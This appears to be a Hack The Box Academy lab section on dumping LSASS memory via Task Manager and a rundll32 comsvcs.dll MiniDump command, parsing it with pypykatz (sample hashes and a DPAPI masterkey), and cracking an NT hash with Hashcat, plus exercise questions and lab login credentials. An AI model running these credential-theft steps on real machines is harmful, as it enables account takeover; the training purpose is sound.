# Attacking LSASS

> Hack The Box Academy — Module 147, Section 12 / 26

In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the **Local Security Authority Subsystem Service (LSASS)**. As covered in the *Credential Storage* section of this module, LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.

<img width="1024" height="738" alt="lsass-taskmanager-dump" src="https://github.com/user-attachments/assets/5c86f697-f419-404d-86a5-4b90f11fde40" />


Upon initial logon, LSASS will:

- Cache credentials locally in memory
- Create access tokens
- Enforce security policies
- Write to Windows' security log

Let's cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.

---

## Dumping LSASS process memory

Similar to the process of attacking the SAM database, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump, so let's cover techniques that can be performed using tools already built into Windows.

### Task Manager method

With access to an interactive graphical session on the target, we can use Task Manager to create a memory dump. This requires us to:

1. Open Task Manager
2. Select the **Processes** tab
3. Find and right-click the **Local Security Authority Process**
4. Select **Create dump file**

<img width="2048" height="1148" alt="lsass-authentication-flow" src="https://github.com/user-attachments/assets/14d7c90f-e3bc-45c9-9c4f-1ce0e22095c8" />


A file called `lsass.DMP` is created and saved in `%temp%`. This is the file we will transfer to our attack host. We can use the file transfer method discussed in the previous section of this module to transfer the dump file to our attack host.

### Rundll32.exe & Comsvcs.dll method

The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called `rundll32.exe`. This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.

Before issuing the command to create the dump file, we must determine what process ID (`PID`) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:

#### Finding LSASS's PID in cmd

From cmd, we can issue the command `tasklist /svc` to find `lsass.exe` and its process ID.

```cmd
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```

#### Finding LSASS's PID in PowerShell

From PowerShell, we can issue the command `Get-Process lsass` and see the process ID in the `Id` field.

```powershell
PS C:\Windows\system32> Get-Process lsass

Handles NPM(K) PM(K) WS(K) CPU(s)  Id SI ProcessName
------- ------ ----- ----- ------  -- -- -----------
   1260     21  4948 15396   2.56 672  0 lsass
```

Once we have the PID assigned to the LSASS process, we can create a dump file.

#### Creating a dump file using PowerShell

With an elevated PowerShell session, we can issue the following command to create a dump file:

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the `MiniDumpWriteDump` (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). Recall that most modern AV tools recognize this as malicious activity and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.

If we manage to run this command and generate the `lsass.dmp` file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.

> **Note:** We can use the file transfer method discussed in the *Attacking SAM* section to get the `lsass.dmp` file from the target to our attack host.

---

## Using Pypykatz to extract credentials

Once we have the dump file on our attack host, we can use a powerful tool called **pypykatz** to extract credentials from the `.dmp` file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.

Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let's run Pypykatz against the dump file and find out.

### Running Pypykatz

The command initiates the use of `pypykatz` to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of the **Local Security Authority**, then we specify the data source as a `minidump` file, proceeded by the path to the dump file stored on our attack host. Pypykatz parses the dump file and outputs the findings:

```shell-session
naruto3co@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
        == MSV ==
                Username: bob
                Domain: DESKTOP-33E7O54
                LM: NA
                NT: 64f12cddaa88057e06a81b54e73b949b
                SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
                DPAPI: NA
        == WDIGEST [14ab89]==
                username bob
                domainname DESKTOP-33E7O54
                password None
                password (hex)
        == Kerberos ==
                Username: bob
                Domain: DESKTOP-33E7O54
        == WDIGEST [14ab89]==
                username bob
                domainname DESKTOP-33E7O54
                password None
                password (hex)
        == DPAPI [14ab89]==
                luid 1354633
                key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
                masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a4...
                sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
        == MSV ==
                Username: bob
                Domain: DESKTOP-33E7O54
                LM: NA
                NT: 64f12cddaa88057e06a81b54e73b949b
                SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
                DPAPI: NA
        == WDIGEST [14ab55]==
                username bob
                domainname DESKTOP-33E7O54
                password None
                password (hex)
        == Kerberos ==
                Username: bob
                Domain: DESKTOP-33E7O54
        == WDIGEST [14ab55]==
                username bob
                domainname DESKTOP-33E7O54
                password None
                password (hex)
== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
        == WDIGEST [148173]==
                username WIN-6T0C3J2V6HP$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [148173]==
                username WIN-6T0C3J2V6HP$
                domainname WORKGROUP
                password None
                password (hex)
```

Let's take a more detailed look at some of the useful information in the output.

### MSV

```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
        == MSV ==
                Username: bob
                Domain: DESKTOP-33E7O54
                LM: NA
                NT: 64f12cddaa88057e06a81b54e73b949b
                SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
                DPAPI: NA
```

`MSV` is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the `bob` user account's logon session stored in LSASS process memory. This will prove helpful in the next step of our attack covered at the end of this section.

### WDIGEST

```shell-session
        == WDIGEST [14ab89]==
                username bob
                domainname DESKTOP-33E7O54
                password None
                password (hex)
```

`WDIGEST` is an older authentication protocol enabled by default in **Windows XP – Windows 8** and **Windows Server 2003 – Windows Server 2012**. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST.

### Kerberos

```shell-session
        == Kerberos ==
                Username: bob
                Domain: DESKTOP-33E7O54
```

`Kerberos` is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.

### DPAPI

```shell-session
        == DPAPI [14ab89]==
                luid 1354633
                key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
                masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a4...
                sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Mimikatz and Pypykatz can extract the DPAPI `masterkey` for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered in greater detail in the *Windows Privilege Escalation* module.

---

## Cracking the NT Hash with Hashcat

We can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the `bob` user. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.

```shell-session
naruto3co@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

Our cracking attempt completes, and our overall attack can be considered a success.

```
64f12cddaa88057e06a81b54e73b949b:Password1
```

---

## Questions

**Question 1** (+40)
What is the name of the executable file associated with the Local Security Authority Process?

**Question 2** (+40)
Apply the concepts taught in this section to obtain the password to the **Vendor** user account on the target. Submit the clear-text password as the answer. *(Format: Case sensitive)*

> RDP to the target with user `htb-student` and password `HTB_@cademy_stdnt!`

---

*Source: https://academy.hackthebox.com/app/module/147/section/1359*
